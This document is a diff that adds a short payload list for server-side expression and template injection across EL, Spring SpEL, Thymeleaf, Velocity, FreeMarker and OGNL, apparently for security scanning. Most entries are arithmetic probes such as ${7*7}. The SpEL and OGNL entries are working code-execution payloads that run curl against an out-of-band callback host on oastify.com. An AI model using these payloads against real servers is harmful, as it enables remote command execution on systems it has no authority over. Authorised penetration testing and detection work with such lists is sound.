@@ -1,0 +1,25 @@
+=== EL (Expression Language) ===
+${7*7}
+${java:version}
+${java:os}
+${application:name}
+
+=== Spring SpEL ===
+#{${7*7}}
+${T(java.lang.Runtime).getRuntime().exec('curl http://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/spel')}
+
+=== Thymeleaf ===
+<p data-th-text="${7*7}">test</p>
+<p th:text="${java:version}">test</p>
+
+=== Velocity ===
+$!{7*7}
+${application:name}
+
+=== FreeMarker ===
+${7*7}
+<#assign x=7*7>${x}
+
+=== OGNL ===
+%{7*7}
+%{#a=@java.lang.Runtime@getRuntime().exec('curl http://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/ognl')}
